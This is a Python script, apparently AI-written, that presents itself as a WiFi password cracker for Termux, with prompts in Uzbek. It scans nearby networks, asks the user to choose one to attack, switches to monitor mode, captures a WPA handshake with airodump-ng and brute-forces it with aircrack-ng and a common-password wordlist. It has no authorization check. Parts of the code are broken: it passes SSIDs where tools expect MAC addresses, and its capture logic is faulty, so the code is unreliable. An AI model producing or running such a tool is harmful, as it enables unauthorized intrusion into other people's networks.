#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFi Password Cracker for Termux
Author: Assistant
Description: Scan WiFi networks and attempt to crack passwords
"""

import subprocess
import re
import time
import os
import sys
from typing import List, Dict, Optional

class WiFiCracker:
    def __init__(self):
        self.networks = []
        self.selected_network = None
        
    def check_dependencies(self) -> bool:
        """Check if required tools are installed"""
        required_tools = ['aircrack-ng', 'iwlist', 'ifconfig']
        missing_tools = []
        
        for tool in required_tools:
            try:
                subprocess.run([tool, '--version'], capture_output=True, check=True)
            except (subprocess.CalledProcessError, FileNotFoundError):
                missing_tools.append(tool)
        
        if missing_tools:
            print("❌ Quyidagi dasturlar o'rnatilmagan:")
            for tool in missing_tools:
                print(f"   - {tool}")
            print("\n📦 O'rnatish uchun quyidagi buyruqlarni ishga tushiring:")
            print("pkg update && pkg upgrade")
            print("pkg install aircrack-ng")
            print("pkg install wireless-tools")
            return False
        
        return True
    
    def get_wifi_interfaces(self) -> List[str]:
        """Get available WiFi interfaces"""
        try:
            result = subprocess.run(['ifconfig'], capture_output=True, text=True)
            interfaces = re.findall(r'(\w+):\s+flags=', result.stdout)
            wifi_interfaces = []
            
            for interface in interfaces:
                if interface.startswith('wlan') or interface.startswith('wifi'):
                    wifi_interfaces.append(interface)
            
            return wifi_interfaces
        except Exception as e:
            print(f"❌ WiFi interfeyslarini topishda xatolik: {e}")
            return []
    
    def scan_networks(self, interface: str) -> List[Dict]:
        """Scan for available WiFi networks"""
        print(f"🔍 WiFi tarmoqlarini skanerlayapman... (interfeys: {interface})")
        
        try:
            # Use iwlist to scan networks
            cmd = f"iwlist {interface} scan"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if result.returncode != 0:
                print("❌ WiFi skanerlashda xatolik. Root huquqlarini tekshiring.")
                return []
            
            # Parse scan results
            networks = []
            current_network = {}
            
            for line in result.stdout.split('\n'):
                if 'Cell' in line and 'Address' in line:
                    if current_network:
                        networks.append(current_network)
                    current_network = {}
                    # Extract MAC address
                    mac_match = re.search(r'Address: ([0-9A-Fa-f:]+)', line)
                    if mac_match:
                        current_network['mac'] = mac_match.group(1)
                
                elif 'ESSID' in line:
                    essid_match = re.search(r'ESSID:"([^"]*)"', line)
                    if essid_match:
                        current_network['ssid'] = essid_match.group(1)
                
                elif 'Channel' in line:
                    channel_match = re.search(r'Channel:(\d+)', line)
                    if channel_match:
                        current_network['channel'] = int(channel_match.group(1))
                
                elif 'Encryption key' in line:
                    if 'on' in line:
                        current_network['encrypted'] = True
                    else:
                        current_network['encrypted'] = False
                
                elif 'Signal level' in line:
                    signal_match = re.search(r'Signal level=([-\d]+)', line)
                    if signal_match:
                        current_network['signal'] = int(signal_match.group(1))
            
            if current_network:
                networks.append(current_network)
            
            # Filter out networks without SSID
            networks = [net for net in networks if net.get('ssid')]
            
            return networks
            
        except Exception as e:
            print(f"❌ Tarmoqlarni skanerlashda xatolik: {e}")
            return []
    
    def display_networks(self, networks: List[Dict]):
        """Display available networks in a numbered list"""
        if not networks:
            print("❌ Hech qanday WiFi tarmog'i topilmadi!")
            return
        
        print("\n📡 Topilgan WiFi tarmoqlari:")
        print("=" * 60)
        
        for i, network in enumerate(networks, 1):
            ssid = network.get('ssid', 'Noma\'lum')
            mac = network.get('mac', 'N/A')
            channel = network.get('channel', 'N/A')
            encrypted = "🔒" if network.get('encrypted', False) else "🔓"
            signal = network.get('signal', 'N/A')
            
            print(f"{i:2d}. {encrypted} {ssid}")
            print(f"    MAC: {mac} | Kanal: {channel} | Signal: {signal} dBm")
            print()
        
        self.networks = networks
    
    def select_network(self) -> Optional[Dict]:
        """Let user select a network to attack"""
        if not self.networks:
            print("❌ Skanerlash natijalari mavjud emas!")
            return None
        
        while True:
            try:
                choice = input(f"🎯 Hujum qilish uchun tarmoq raqamini kiriting (1-{len(self.networks)}): ")
                choice = int(choice)
                
                if 1 <= choice <= len(self.networks):
                    selected = self.networks[choice - 1]
                    print(f"\n✅ Tanlangan tarmoq: {selected['ssid']}")
                    return selected
                else:
                    print("❌ Noto'g'ri raqam! Qaytadan kiriting.")
            except ValueError:
                print("❌ Raqam kiriting!")
            except KeyboardInterrupt:
                print("\n\n👋 Dastur to'xtatildi.")
                sys.exit(0)
    
    def start_monitor_mode(self, interface: str) -> bool:
        """Start monitor mode on the interface"""
        print(f"🔧 {interface} interfeysini monitor rejimiga o'tkazish...")
        
        try:
            # Stop the interface
            subprocess.run(['ifconfig', interface, 'down'], check=True)
            
            # Set monitor mode
            subprocess.run(['iwconfig', interface, 'mode', 'monitor'], check=True)
            
            # Start the interface
            subprocess.run(['ifconfig', interface, 'up'], check=True)
            
            print("✅ Monitor rejimi yoqildi!")
            return True
            
        except subprocess.CalledProcessError as e:
            print(f"❌ Monitor rejimini yoqishda xatolik: {e}")
            return False
    
    def capture_handshake(self, interface: str, target_ssid: str, target_channel: int) -> bool:
        """Capture handshake packets"""
        print(f"📡 {target_ssid} uchun handshake paketlarini yig'ish...")
        print("⏳ Bu jarayon bir necha daqiqa davom etishi mumkin...")
        
        try:
            # Start airodump-ng to capture packets
            cmd = [
                'airodump-ng',
                '--bssid', target_ssid,
                '--channel', str(target_channel),
                '--write', f'capture_{target_ssid}',
                '--output-format', 'cap',
                interface
            ]
            
            print("🔄 Paketlarni yig'ish boshlandi. To'xtatish uchun Ctrl+C bosing...")
            
            # Run for 30 seconds
            process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            
            try:
                process.wait(timeout=30)
            except subprocess.TimeoutExpired:
                process.terminate()
                print("✅ Paket yig'ish tugallandi!")
                return True
                
        except Exception as e:
            print(f"❌ Handshake yig'ishda xatolik: {e}")
            return False
    
    def crack_password(self, target_ssid: str, wordlist_path: str = None) -> Optional[str]:
        """Attempt to crack the password"""
        print(f"🔓 {target_ssid} parolini buzish...")
        
        # Use default wordlist if none provided
        if not wordlist_path:
            wordlist_path = "/data/data/com.termux/files/usr/share/wordlists/rockyou.txt"
            
            # Create a simple wordlist if rockyou.txt doesn't exist
            if not os.path.exists(wordlist_path):
                print("📝 Oddiy parol ro'yxatini yaratish...")
                self.create_simple_wordlist()
                wordlist_path = "simple_wordlist.txt"
        
        capture_file = f"capture_{target_ssid}-01.cap"
        
        if not os.path.exists(capture_file):
            print("❌ Capture fayli topilmadi!")
            return None
        
        try:
            cmd = [
                'aircrack-ng',
                capture_file,
                '-w', wordlist_path,
                '-b', target_ssid
            ]
            
            print("🔍 Parolni qidirish boshlandi...")
            result = subprocess.run(cmd, capture_output=True, text=True)
            
            # Parse result for password
            if "KEY FOUND!" in result.stdout:
                password_match = re.search(r'KEY FOUND! \[ (.*) \]', result.stdout)
                if password_match:
                    return password_match.group(1)
            
            print("❌ Parol topilmadi!")
            return None
            
        except Exception as e:
            print(f"❌ Parol buzishda xatolik: {e}")
            return None
    
    def create_simple_wordlist(self):
        """Create a simple wordlist with common passwords"""
        common_passwords = [
            "12345678", "password", "1234567890", "qwerty123",
            "admin123", "123456789", "password123", "12345678910",
            "admin", "root", "user", "guest", "welcome",
            "123456", "1234567", "123456789", "1234567890",
            "qwerty", "abc123", "password", "password123",
            "admin123", "12345678", "qwerty123", "123456789",
            "password123", "12345678910", "admin", "root",
            "user", "guest", "welcome", "123456", "1234567",
            "123456789", "1234567890", "qwerty", "abc123"
        ]
        
        with open("simple_wordlist.txt", "w") as f:
            for pwd in common_passwords:
                f.write(pwd + "\n")
        
        print("✅ Oddiy parol ro'yxati yaratildi: simple_wordlist.txt")
    
    def cleanup(self, interface: str):
        """Clean up and restore interface"""
        print("🧹 Tozalash...")
        
        try:
            # Stop monitor mode
            subprocess.run(['ifconfig', interface, 'down'], check=True)
            subprocess.run(['iwconfig', interface, 'mode', 'managed'], check=True)
            subprocess.run(['ifconfig', interface, 'up'], check=True)
            
            # Remove capture files
            for file in os.listdir('.'):
                if file.startswith('capture_') and file.endswith('.cap'):
                    os.remove(file)
            
            print("✅ Tozalash tugallandi!")
            
        except Exception as e:
            print(f"⚠️ Tozalashda xatolik: {e}")
    
    def run(self):
        """Main execution method"""
        print("🔓 WiFi Password Cracker")
        print("=" * 40)
        
        # Check dependencies
        if not self.check_dependencies():
            return
        
        # Get WiFi interfaces
        interfaces = self.get_wifi_interfaces()
        if not interfaces:
            print("❌ WiFi interfeyslari topilmadi!")
            return
        
        print(f"📡 Topilgan WiFi interfeyslari: {', '.join(interfaces)}")
        
        # Use first available interface
        interface = interfaces[0]
        print(f"🎯 Foydalaniladigan interfeys: {interface}")
        
        # Start monitor mode
        if not self.start_monitor_mode(interface):
            return
        
        try:
            # Scan networks
            networks = self.scan_networks(interface)
            self.display_networks(networks)
            
            # Select target network
            target = self.select_network()
            if not target:
                return
            
            # Capture handshake
            if self.capture_handshake(interface, target['ssid'], target['channel']):
                # Attempt to crack password
                password = self.crack_password(target['ssid'])
                
                if password:
                    print(f"\n🎉 PAROL TOPILDI!")
                    print(f"📶 Tarmoq: {target['ssid']}")
                    print(f"🔑 Parol: {password}")
                else:
                    print(f"\n❌ {target['ssid']} parolini buzib bo'lmadi!")
            else:
                print("❌ Handshake yig'ishda xatolik!")
                
        finally:
            # Cleanup
            self.cleanup(interface)

def main():
    """Main function"""
    try:
        cracker = WiFiCracker()
        cracker.run()
    except KeyboardInterrupt:
        print("\n\n👋 Dastur to'xtatildi.")
    except Exception as e:
        print(f"\n❌ Kutilmagan xatolik: {e}")

if __name__ == "__main__":
    main()